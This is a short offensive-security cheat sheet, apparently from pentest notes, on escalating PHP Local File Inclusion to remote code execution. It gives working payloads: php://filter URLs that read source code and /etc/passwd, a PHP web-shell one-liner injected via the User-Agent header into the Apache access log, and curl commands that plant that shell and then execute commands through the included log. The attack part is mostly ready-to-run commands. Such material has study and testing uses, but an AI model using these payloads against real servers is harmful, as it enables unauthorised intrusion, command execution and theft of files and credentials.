# 04.03 Local File Inclusion LFI → RCE

> Turn a PHP LFI into RCE by poisoning `/var/log/apache2/access.log`, `/proc/self/environ`, or via `php://filter`/`php://input` wrappers.

## Overview

LFI executes the included file as code in PHP. Chain with log poisoning (`/var/log/apache2/access.log`), /proc/self/environ, PHP wrappers (php://filter, php://input, data://, expect://).

## Steps

- **Confirm include vs read** — same payload returns different output for include().
- **php://filter** — base64-encode source to read PHP source.
- **Log poisoning** — inject `<?php system($_GET['c']); ?>` into User-Agent → include the log.
- **phpinfo + LFI race** — upload via PHP, race the temp file.

## Commands

### PHP wrapper read-source

```text
?page=php://filter/convert.base64-encode/resource=index
?page=php://filter/read=convert.base64-encode/resource=/etc/passwd
```

### Log poisoning chain

```bash
curl -A '<?php system($_GET["c"]); ?>' http://<TARGET>/
curl 'http://<TARGET>/index.php?page=/var/log/apache2/access.log&c=id'
```
